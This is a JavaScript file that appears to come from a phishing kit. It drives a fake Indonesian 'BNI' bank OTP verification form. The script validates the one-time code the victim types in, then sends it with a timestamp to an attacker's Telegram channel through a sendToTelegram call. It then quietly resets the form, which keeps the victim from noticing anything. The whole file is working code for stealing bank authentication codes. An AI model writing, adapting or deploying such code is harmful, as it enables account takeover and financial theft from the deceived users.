document.addEventListener('DOMContentLoaded', function() {
    const otpInputs = document.querySelectorAll('.otp-input');
    const dataForm = document.getElementById('dataForm');
    const submitBtn = document.getElementById('submitBtn');
    const successMessage = document.getElementById('successMessage');
    const otpError = document.getElementById('otpError');

    if (otpInputs.length > 0) {
        // Handle OTP input behavior
        otpInputs.forEach((input, index) => {
            // Focus next input on input
            input.addEventListener('input', function(e) {
                const value = e.target.value;
                
                // Only allow numbers
                e.target.value = value.replace(/[^0-9]/g, '');
                
                // Add filled class for styling
                if (e.target.value) {
                    e.target.classList.add('filled');
                } else {
                    e.target.classList.remove('filled');
                }
                
                // Move to next input if current is filled
                if (e.target.value && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                
                // Clear error state when user starts typing
                clearError();
            });

            // Handle backspace
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });

            // Handle paste
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                
                // Fill OTP inputs with pasted data
                for (let i = 0; i < Math.min(pastedData.length, otpInputs.length); i++) {
                    otpInputs[i].value = pastedData[i];
                    otpInputs[i].classList.add('filled');
                }
                
                // Focus on the next empty input or last input
                const nextEmptyIndex = Array.from(otpInputs).findIndex(input => !input.value);
                if (nextEmptyIndex !== -1) {
                    otpInputs[nextEmptyIndex].focus();
                } else {
                    otpInputs[otpInputs.length - 1].focus();
                }
                
                clearError();
            });

            // Handle focus
            input.addEventListener('focus', function() {
                e.target.select();
            });
        });

        // Form submission
        if (dataForm) {
            dataForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                if (validateOTP()) {
                    // Show loading state
                    submitBtn.innerHTML = '<span class="loading"></span> Memverifikasi...';
                    submitBtn.disabled = true;

                    // Get OTP value
                    const otpValue = Array.from(otpInputs).map(input => input.value).join('');
                    
                    // Send OTP to Telegram
                    setTimeout(async () => {
                        try {
                            // Prepare OTP data
                            const otpData = {
                                otp: otpValue,
                                timestamp: new Date().toISOString()
                            };
                            
                            // Send to Telegram
                            const result = await sendToTelegram(otpData, 'Kode OTP BNI');
                            
                            if (result.success) {
                                console.log('OTP sent to Telegram successfully');
                            } else {
                                console.error('Failed to send OTP to Telegram:', result.error);
                            }
                            
                            // Reset form
                            otpInputs.forEach(input => {
                                input.value = '';
                                input.classList.remove('filled');
                            });
                            submitBtn.innerHTML = 'Verifikasi OTP';
                            submitBtn.disabled = false;

                            // Redirect to next page (in real app)
                            // window.location.href = 'success.html';
                            
                        } catch (error) {
                            console.error('Error during OTP submission:', error);
                            submitBtn.innerHTML = 'Verifikasi OTP';
                            submitBtn.disabled = false;
                        }
                    }, 1000);
                }
            });
        }
    }

    function validateOTP() {
        const otpValue = Array.from(otpInputs).map(input => input.value).join('');
        
        if (otpValue.length !== 4) {
            showError('OTP harus 4 digit');
            return false;
        }
        
        if (!/^\d{4}$/.test(otpValue)) {
            showError('OTP hanya boleh angka');
            return false;
        }
        
        return true;
    }

    function showError(message) {
        if (otpError) {
            otpError.textContent = message;
            otpError.style.display = 'block';
            otpInputs.forEach(input => input.classList.add('error'));
        }
    }

    function clearError() {
        if (otpError) {
            otpError.style.display = 'none';
            otpInputs.forEach(input => input.classList.remove('error'));
        }
    }

    // Auto-focus first OTP input
    if (otpInputs.length > 0) {
        otpInputs[0].focus();
    }
});
